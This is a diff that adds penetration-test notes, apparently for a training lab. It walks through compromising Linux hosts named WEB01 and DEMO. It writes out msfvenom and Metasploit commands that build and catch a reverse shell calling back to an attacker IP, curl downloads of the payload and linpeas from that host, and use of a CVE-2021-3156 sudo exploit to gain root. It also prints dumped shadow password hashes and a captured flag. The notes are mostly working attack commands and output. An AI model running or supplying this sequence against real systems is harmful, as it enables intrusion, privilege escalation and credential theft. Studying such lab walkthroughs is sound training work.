@@ -54,5 +54,68 @@ fireball         (id_edcsa)
 # SSH it with the password cracked again
 cat local.txt
 
+# Create stable listener
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=8888 -f elf > cute.elf  
+msfconsole
+use multi/handler
+set payload linux/x64/shell_reverse_tcp
+set LHOST tun0
+set LPORT 8888
+set ExitonSession false
+run -j
+curl http://192.168.45.165:8088/Relia/cute.elf --output cute.elf
+chmod 755 cute.elf
+./cute.elf
 
+# Upload the linpeas
+sessions -i 1 -t 100
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+curl http://192.168.45.165:8088/Linux/linpeas.sh --output linpeas.sh
+chmod 755 linpeas.sh
+anita@web01:/home/anita$ bash linpeas.sh
+...
+[+] [CVE-2021-3156] sudo Baron Samedit
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+...
+
+# Based on the linpeas results, it is suggested to use CVE-2021-3156 to exploit, We download the source code file from
+# Reference https://github.com/worawit/CVE-2021-3156
+anita@web01:/home/anita$ curl http://192.168.45.165:8088/Relia/WEB01/exploit_nss.py -o exp_nss.py
+anita@web01:/home/anita$ python3 exp_nss.py
+# Successful!
+whoami
+root
+cd /root
+cat proof.txt
+2c3af8035e3c106f68501b857085372a
+# Go to /tmp run the cute.elf again to establish a Full Interactive TTY
+sessions -i 2 -t 100
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+cd /home/anita
+./linpeas
+...
+miranda:$6$01GOUNyvP1lFg0Id$QoFsKEsD4um4ctVU62MU/KEmQbdj0OSw7gJ6EXVA4YTjTNxvfzQxdhdsyjHUaw4qO0YAwEMoXUXWBdCd3zW4V.:19277:0:99999:7:::             
+steven:$6$Rj4tu27TLjcnwC2v$wsNuqImPdduB9mXZHpjjEROvTKwWsp2SckcMB.AtcvHyS7tHTCGh.CrUCP0ogsFH9IjG3i2qekcAXRlkmeZOT1:19277:0:99999:7:::               
+mark:$6$blWxRVRno5YcdGiN$6ekTTBXDvGfaFRSPxZVLhR8tAmFd20RLlXNL5Q8U44gp0Heq7MLmFZrlaHeaX.pFhlJ3lif10E1zsO3W2tdbC/:19277:0:99999:7:::                 
+anita:$6$Fq6VqZ4n0zxZ9Jh8$4gcSpNrlib60CDuGIHpPZVT0g/CeVDV0jR3fkOC7zIEaWEsnkcQfKp8YVCaZdGFvaEsHCuYHbALFn49meC.Rj1:19277:0:99999:7:::   
+offsec:$6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeIJglRJg0F0vFKNBT39a57gakRJ2zPw/:19277:0:99999:7:::              
+$6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeI
+...
+
+# DEMO
+# Use the same SSH methods like WEB01 on the DEMO
+ssh -i id_edcsa anita@192.168.243.246 -p 2222
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+anita@demo:/tmp$ hostname
+demo
+anita@demo:$ cat local.txt
+# Curl linpeas and chmod 755
+...
+[+] [CVE-2021-3156] sudo Baron Samedit
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+...
+
+# Upload the same exploit script from WEB01
 
